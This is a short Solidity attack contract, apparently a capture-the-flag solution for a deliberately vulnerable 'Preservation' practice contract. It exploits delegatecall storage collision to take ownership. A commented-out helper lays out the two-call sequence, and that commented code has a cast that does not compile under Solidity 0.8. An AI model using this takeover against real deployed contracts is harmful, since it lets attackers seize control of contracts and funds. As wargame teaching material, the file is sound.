// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "../contracts/PreservationSample.sol";

contract AttackLibraryContract {
    address public timeZone1Library; // slot 1
    address public timeZone2Library; // slot 2
    address public owner; // slot 3
    uint256 storedTime; //slot 4

    // function hack(address _preservation, address _player) external {
    //     Preservation(_preservation).setFirstTime(uint256((address(this))));
    //     Preservation(_preservation).setFirstTime(uint256(_player));
    // }

    function setTime(uint256) public {
        owner = msg.sender;
    }
}
